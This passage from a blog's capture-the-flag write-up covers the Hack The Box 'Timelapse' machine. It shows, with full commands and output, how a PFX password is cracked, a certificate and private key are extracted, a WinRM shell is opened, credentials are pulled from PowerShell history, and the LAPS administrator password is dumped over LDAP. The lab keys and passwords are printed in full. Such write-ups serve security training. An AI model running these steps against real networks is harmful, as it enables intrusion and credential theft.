class="SemanticString"><span>Using default input encoding: UTF-8
+Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
+Cost 1 (iteration count) is 2000 for all loaded hashes
+Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
+Will run 4 OpenMP threads
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+thuglegacy       (?)     
+1g 0:00:01:13 DONE (2022-07-10 23:33) 0.01357g/s 43885p/s 43885c/s 43885C/s thuglife06..thsco04
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.</span></span></span></code></pre><div id="https://www.notion.so/1683a8c5ff9f4d488d02b4e6683d0964" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The cracked import password is: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">thuglegacy</code></span></span></p></div><div id="https://www.notion.so/4584c214dd7f44f787c169f1fed102a8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With the password cracked, we can move on to extracting the certificate and private key from the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.pfx</code></span><span class="SemanticString"> file:</span></span></p></div><div id="https://www.notion.so/4f2f07c51e45424496357d8573eda3d8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ openssl pkcs12 -in ./Dev/legacyy_dev_auth.pfx -nocerts -out legacy_dev.key</code></span></span></p></div><div id="https://www.notion.so/2b3e5e2bade6440bab95eedfa08284f7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">After entering the import password, we enter a new password used to protect the new </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.key</code></span><span class="SemanticString"> file. Note that this key does not have to be secure, as we will be decrypting it immediately after anyway. Next, we extract the certificate:</span></span></p></div><div id="https://www.notion.so/8ec2ea5f28954a409783043d77847295" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ openssl pkcs12 -in ./Dev/legacyy_dev_auth.pfx -clcerts -nokeys -out legacy_dev.crt</code></span></span></p></div><pre id="https://www.notion.so/dc716b4d6f374fc6bdb28a691549d7d0" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Bag Attributes
+    localKeyID: 01 00 00 00 
+subject=CN = Legacyy
+
+issuer=CN = Legacyy
+
+-----BEGIN CERTIFICATE-----
+MIIDJjCCAg6gAwIBAgIQHZmJKYrPEbtBk6HP9E4S3zANBgkqhkiG9w0BAQsFADAS
+MRAwDgYDVQQDDAdMZWdhY3l5MB4XDTIxMTAyNTE0MDU1MloXDTMxMTAyNTE0MTU1
+MlowEjEQMA4GA1UEAwwHTGVnYWN5eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
+AQoCggEBAKVWB6NiFkce4vNNI61hcc6LnrNKhyv2ibznhgO7/qocFrg1/zEU/og0
+0E2Vha8DEK8ozxpCwem/e2inClD5htFkO7U3HKG9801NFeN0VBX2ciIqSjA63qAb
+YX707mBUXg8Ccc+b5hg/CxuhGRhXxA6nMiLo0xmAMImuAhJZmZQepOHJsVb/s86Z
+7WCzq2I3VcWg+7XM05hogvd21lprNdwvDoilMlE8kBYa22rIWiaZismoLMJJpa72
+MbSnWEoruaTrC8FJHxB8dbapf341ssp6AK37+MBrq7ZX2W74rcwLY1pLM6giLkcs
+yOeu6NGgLHe/plcvQo8IXMMwSosUkfECAwEAAaN4MHYwDgYDVR0PAQH/BAQDAgWg
+MBMGA1UdJQQMMAoGCCsGAQUFBwMCMDAGA1UdEQQpMCegJQYKKwYBBAGCNxQCA6AX
+DBVsZWdhY3l5QHRpbWVsYXBzZS5odGIwHQYDVR0OBBYEFMzZDuSvIJ6wdSv9gZYe
+rC2xJVgZMA0GCSqGSIb3DQEBCwUAA4IBAQBfjvt2v94+/pb92nLIS4rna7CIKrqa
+m966H8kF6t7pHZPlEDZMr17u50kvTN1D4PtlCud9SaPsokSbKNoFgX1KNX5m72F0
+3KCLImh1z4ltxsc6JgOgncCqdFfX3t0Ey3R7KGx6reLtvU4FZ+nhvlXTeJ/PAXc/
+fwa2rfiPsfV51WTOYEzcgpngdHJtBqmuNw3tnEKmgMqp65KYzpKTvvM1JjhI5txG
+hqbdWbn2lS4wjGy3YGRZw6oM667GF13Vq2X3WHZK5NaP+5Kawd/J+Ms6riY0PDbh
+nx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA
+-----END CERTIFICATE-----</span></span></span></code></pre><div id="https://www.notion.so/ffadfb07da60406eacd6f2a37563a15e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Finally, we also decrypt the private key:</span></span></p></div><div id="https://www.notion.so/42a04588e6644099a2d4712ab90bf216" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ openssl rsa -in legacy_dev.key -out legacy-decrypted.key</code></span></span></p></div><pre id="https://www.notion.so/a174f70684ee49a486fb4f4e80aa8601" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEApVYHo2IWRx7i800jrWFxzoues0qHK/aJvOeGA7v+qhwWuDX/
+MRT+iDTQTZWFrwMQryjPGkLB6b97aKcKUPmG0WQ7tTccob3zTU0V43RUFfZyIipK
+MDreoBthfvTuYFReDwJxz5vmGD8LG6EZGFfEDqcyIujTGYAwia4CElmZlB6k4cmx
+Vv+zzpntYLOrYjdVxaD7tczTmGiC93bWWms13C8OiKUyUTyQFhrbashaJpmKyags
+wkmlrvYxtKdYSiu5pOsLwUkfEHx1tql/fjWyynoArfv4wGurtlfZbvitzAtjWksz
+qCIuRyzI567o0aAsd7+mVy9CjwhcwzBKixSR8QIDAQABAoIBAHNSXmGHuSJCWOp7
+k7cLkOYQXNGR2la/z7MDimZwamEc1nwGrcj+a8t1ixWShXxdFvYV8N7QUZFJDjsg
+yAFTCsZis4LivgXTCDGS4wGT0lK/YzyRYs3hQgdLEeYL0Xk/X5v4iInWo9eloYnU
+BD0Geqn91OqkmxneX/yocql59bVpyxjXcANGQWAUWlEQTqhCBZqR27lmQnYrNtAr
+87CwfkPCwpVc+FJJj19UUxZx08SVtAKLPiRzAUbi8Oe/O/AQnYy+g2GIXUeJIi5c
+S1W8l6z/uMPHTrq0YMXWEOosi+FJlCH766rvGlHU8pCTlb+sFmsOccR/AN9Z5f4V
+redLxEECgYEA2HMEL12ns8MZ87vsyewbXZzegyVbYREPvY6rlVG2VpQCP4NjCrZC
+pJA/a1mQCurty8BpgwwlK3B0AQ9Ie7cpMDfSUyYbl5JIktXktwYgLpjK5yhTPsD6
+HV4tfuMCZN2E1ijyi16O9Smy6PuTSdi1Jr7zw8iE0I7KGaBsSw2byxcCgYEAw4wO
+2B0Pkt8GJPtdavTOYkUfWwV0m1GY2vC1XnFuRQx+Ik6loO8atLmJy2dNZiLMIope
+d/uUXIeaKQ8xUmh3ktlzT3/2P/051dfoCG9wCAnEwG+GwJ4Gruc5ulUjaWF1I04b
+6y796aF3sxbQlixASq1jsVkT+CXoCGZw9QX5kDcCgYBCWD7YJeTZfNvfkaKq4ewh
+bYvmtvSjdA9XEvwU8M7rCsMFpMge6G7U8kH+LZ2xOwFYisnMmVRrVDS6fmzBPwso
+9HNLeUrL0tLb7yQD1aTXo43N/NZHTe9cQRnA4uRA9oVY/4QYpAs9qmJkd3hWEk60
+aaNeR4AuTRY1dK688pbmUQKBgC+7N0BfT5bdI4XRaYsa+GmaT74LBdyHvVTr3omQ
+DIeENiGvqtQuqQkmJNFmhMkCg2uG9Oo6mYtAeku9bp+b6lwJAhGMvZH/AKgHDJdK
+hEEiCUmjr3PC3wTAYiHueDdX15zniv8MOGRXyn0He6C8anEQA76dbLdsoUezoazd
+aX5fAoGBALCTY2/C3aEmSiWXNPxf63NoBRSvjDJxZ3DO+dsaRLW1K7RFCwCpIVTI
+epgMsCFFmmL6ZmxwzDwyBqle2rdvl007vn4oiZAK/nk2v0oN6ixDmIFNHEoFrmSN
+Ipt2m2w7RpUbdloGtPyIMPRMM7qXPAOWWbyPhrB4ZtDmm+zxFpUW
+-----END RSA PRIVATE KEY-----</span></span></span></code></pre><h2 id="https://www.notion.so/1a433f0eff904404b74b4b13b3ae9dfb" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/1a433f0eff904404b74b4b13b3ae9dfb"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Exploitation</span></span></h2><div id="https://www.notion.so/bbc1876c1e8f4d42b13472d5588476cd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With the certificate and key obtained, we can gain shell access using </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">evil-winrm</code></span><span class="SemanticString">. Note that SSL must be enabled using the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">-S</code></span><span class="SemanticString"> option, and we will supply our certificate with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">-c</code></span><span class="SemanticString"> and key with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">-k</code></span><span class="SemanticString"> as so:</span></span></p></div><div id="https://www.notion.so/b08b7ab32b184f68a5f8e9a9e50348b0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ evil-winrm -S -c ./legacy_dev.crt -k ./legacy_dev-decrypted.key -i timelapse.htb</code></span></span></p></div><div id="https://www.notion.so/96dd9ab2f07f42ba8c4126c3d742da91" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Boom, we get a shell as the user </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">legacyy</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/ea81bd5aad2f4fccbf5b468eebaf5635" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Evil-WinRM shell v3.3
+Warning: SSL enabled
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; _</span></span></span></code></pre><div id="https://www.notion.so/f7928ff69f614f228b125432d791f67a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">First thing to do when we gain new access, is to check for privileges:</span></span></p></div><div id="https://www.notion.so/674d4859d73e47fdaada3a6dcd0e9b71" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; whoami /all</code></span></span></p></div><pre id="https://www.notion.so/5709a176c81443bba33978d57bf717a7" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>USER INFORMATION
+----------------
+
+User Name         SID
+================= ============================================
+timelapse\legacyy S-1-5-21-671920749-559770252-3318990721-1603
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                          Attributes
+=========================================== ================ ============================================ ==================================================
+Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+TIMELAPSE\Development                       Group            S-1-5-21-671920749-559770252-3318990721-3101 Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity  Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+...</span></span></span></code></pre><div id="https://www.notion.so/997b552f27ea4b8db1348382aef51988" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">And of course, we can get the user flag!</span></span></p></div><div id="https://www.notion.so/a618e6774a0e4c9d879ded3a13e8dae2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; type ../Desktop/user.txt</code></span></span></p></div><h2 id="https://www.notion.so/2e44bd00062c4a738cbb8d8563a181b5" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/2e44bd00062c4a738cbb8d8563a181b5"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Privilege Escalation</span></span></h2><div id="https://www.notion.so/e0022f165a634587b3bf9ce193fef18c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">To start our enumeration on the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">legacyy</code></span><span class="SemanticString"> user, we will be using winPEAS. Let’s transfer the batch file with the upload module on </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">evil-winrm</code></span><span class="SemanticString">:</span></span></p></div><div id="https://www.notion.so/ccc607e9b53047aeaaed2369ca285fa5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; upload ~/Desktop/HTB/Common/winPEAS.bat</code></span></span></p></div><div id="https://www.notion.so/82fe5956ab514a42a3f3f87c2f71e005" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Then, we run winPEAS with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">stderr</code></span><span class="SemanticString"> (file descriptor 2) redirecting to null, similar to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">2&gt;/dev/null</code></span><span class="SemanticString"> on Linux:</span></span></p></div><div id="https://www.notion.so/560ad64879bf4e51a784fd136a207e6a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; .\winPEAS.bat 2&gt;$null</code></span></span></p></div><pre id="https://www.notion.so/49556dcc4f9c4e4ab0d1178767d1bc29" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>PS default transcript history
+
+Checking PS history file
+ Volume in drive C has no label.
+ Volume Serial Number is 22CC-AE66
+
+ Directory of C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
+
+03/04/2022  12:46 AM               434 ConsoleHost_history.txt
+               1 File(s)            434 bytes
+               0 Dir(s)  10,013,052,928 bytes free
+
+   [i] Maybe you find something interesting</span></span></span></code></pre><div id="https://www.notion.so/2e1e3bf452ee4b93b39f8134126a6728" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">We see that PowerShell history logging is enabled, let’s download that file and analyse it locally:</span></span></p></div><div id="https://www.notion.so/da1bfd4f42634bc2be4fe2f080efdc4c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; download C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt ConsoleHost_history.txt</code></span></span></p></div><pre id="https://www.notion.so/fb72d7b2d137498f95ee46f0a6bf1e57" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>whoami
+ipconfig /all
+netstat -ano |select-string LIST
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$p = ConvertTo-SecureString &#x27;E3R$Q62^12p7PLlC%KWaxuaV&#x27; -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential (&#x27;svc_deploy&#x27;, $p)
+invoke-command -computername localhost -credential $c -port 5986 -usessl -
+SessionOption $so -scriptblock {whoami}
+get-aduser -filter * -properties *
+exit</span></span></span></code></pre><div id="https://www.notion.so/2bf93a3e8f9b41f497ba80c33448d9ac" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Great! The </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">legacyy</code></span><span class="SemanticString"> user entered the credentials for the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">svc_deploy</code></span><span class="SemanticString"> user while creating a PS SecureString, and it was logged in the history file. We have obtained the new credentials: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV</code></span></span></p></div><div id="https://www.notion.so/a8dc850cea104c38bacadf213fee351a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With the new password-based access, we can now perform an LDAP search to enumerate for more information:</span></span></p></div><div id="https://www.notion.so/defd88d3550d4c35a8b99afe6b0433a1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ldapsearch -x -h timelapse.htb -D &#x27;svc_deploy&#x27; -w &#x27;E3R$Q62^12p7PLlC%KWaxuaV&#x27; -b &quot;DC=timelapse,DC=htb&quot;</code></span></span></p></div><div id="https://www.notion.so/c4c55602e7ca416f8851de8b293460d9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This returned a lot of information, which will take some time to go through. Checking for the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">svc_deploy</code></span><span class="SemanticString"> user’s group memberships, we find that it’s a member of the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">LAPS_Readers</code></span><span class="SemanticString"> group, meaning it is able to read the LAPS local administrator password:</span></span></p></div><div id="https://www.notion.so/86c7d1aaa8cc467cb50dbffeea7da36a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; net user svc_deploy</code></span></span></p></div><pre id="https://www.notion.so/90998948f2df42b286fb99060b449610" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Local Group Memberships      *Remote Management Use
+Global Group memberships     *LAPS_Readers         *Domain Users</span></span></span></code></pre><div id="https://www.notion.so/b743865f73804669934e6b92baf78480" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Knowing this, we can filter for the LAPS password when making the LDAP query:</span></span></p></div><div id="https://www.notion.so/6572394c4c4747cbbaf853233670ee48" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ldapsearch -x -h timelapse.htb -D &#x27;svc_deploy&#x27; -w &#x27;E3R$Q62^12p7PLlC%KWaxuaV&#x27; -b &quot;DC=timelapse,DC=htb&quot; &quot;(ms-MCS-AdmPwd=*)&quot; ms-MCS-AdmPwd</code></span></span></p></div><pre id="https://www.notion.so/a74f40953e5544d9bb13c05d1104f364" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span># DC01, Domain Controllers, timelapse.htb
+dn: CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
+ms-Mcs-AdmPwd: }-%o9e8]&amp;333-n+(VEi30J-}</span></span></span></code></pre><div id="https://www.notion.so/47ab54bbd4244fe9afa7a3c2a4d398af" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">We find the LAPS local administrator password under the domain controller: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">}-%o9e8]&amp;333-n+(VEi30J-}</code></span></span></p></div><div id="https://www.notion.so/96eaa173feaa43e792994b3642ea974b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Now, all that’s left is to remote in as the administrator:</span></span></p></div><div id="https://www.notion.so/515bff83dda84285917ac13916753b0b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ evil-winrm -u &#x27;Administrator&#x27; -p &#x27;}-%o9e8]&amp;333-n+(VEi30J-}&#x27; -i timelapse.htb -S</code></span></span></p></div><div id="https://www.notion.so/3847effd15654763a7e653a0bc9c65a6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">And we can get the root flag!</span></span></p></div><h2 id="https://www.notion.so/8af234cb72f14d898b1092c52521d333" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/8af234cb72f14d898b1092c52521d333"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Resources</span></span></h2><ol class="NumberedListWrapper"><li id="https://www.notion.so/cffeafa13e54450ead21b1ba2a737a6b" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString">Extracting the certificate and keys from a .pfx file - </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file">https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file</a></span></span><div id="https://www.notion.so/7eda997414bb4155aeed79749f4f7514" class="Bookmark"><a href="https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file"><h5 class="Bookmark__Title">Extracting the certificate and keys from a .pfx file</h5><p class="Bookmark__Desc">The .pfx file, which is in a PKCS#12 format, contains the SSL certificate (public keys) and the corresponding private keys. Sometimes, you might have to import the certificate and private keys separately in an unencrypted plain text format to use it on another system.</p><p class="Bookmark__Link">https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file</p></a></div></li><li id="https://www.notion.so/3ba664ba3d9f449fa78fce7743cbb683" class="NumberedList" value="2"><span class="SemanticStringArray"><span class="SemanticString">Enumerating AD users with LDAP - </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://vk9-sec.com/enumerating-ad-users-with-ldap/">https://vk9-sec.com/enumerating-ad-users-with-ldap/</a></span></span><div id="https://www.notion.so/79e5e08d40584d92a6b5e57771853838" class="Bookmark"><a href="https://vk9-sec.com/enumerating-ad-users-with-ldap/"><h5 class="Bookmark__Title">Enumerating AD users with LDAP | VK9 Security</h5><p class="Bookmark__Desc">LDAP queries can be used to search for different objects (computers, users, groups) in the Active Directory LDAP database according to certain criteria. This time, we will use LDAP to enumerate Active Directory users. Search LDAP using ldapsearch ldapsearch opens a connection to an LDAP server, binds, and performs a search using specified parameters.</p><p class="Bookmark__Link">https://vk9-sec.com/enumerating-ad-users-with-ldap/</p></a></div></li><li id="https://www.notion.so/4bfa0614dc6b4b7d9f6d676f1cf00e5c" class="NumberedList" value="3"><span class="SemanticStringArray"><span class="SemanticString">Dump LAPS password with ldapsearch - </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://room362.com/post/2017/dump-laps-passwords-with-ldapsearch/">https://room362.com/post/2017/dump-laps-passwords-with-ldapsearch/</a></span></span><div id="https://www.notion.so/78bbb2569baf4d8aa3b6c9d8791a8d49" class="Bookmark"><a href="https://room362.com/post/2017/dump-laps-passwords-with-ldapsearch/"><h5 class="Bookmark__Title">Dump LAPS passwords with ldapsearch</h5><p class="Bookmark__Desc">If you&amp;rsquo;ve ever been pentesting an organization that had LAPS, you know that it is the best solution for randomizing local administrator passwords on the planet. (You should just be leaving them disabled). LAPS stores it&amp;rsquo;s information in Active Directory: The expiration time: ms-Mcs-AdmPwdExpirationTime: 131461867015760024 And the actual password in clear text: ms-Mcs-AdmPwd: %v!e#7S#{s})+y2yS#( When LAPS first came it, any user in Active Directory could read it.</p><p class="Bookmark__Link">https://room362.com/post/2017/dump-laps-passwords-with-ldapsearch/</p></a></div></li></ol><div id="https://www.notion.so/a7c99d283cbd421ea4f674f4dcfb09fb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div></article>
+  <footer class="Footer">
+  <div>samiko@127.0.0.1~$</div>
+  <div>&centerdot;</div>
+  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank" rel="noopener noreferrer">Notablog</a>.</div>
+</footer>
+</body>
+
+</html>
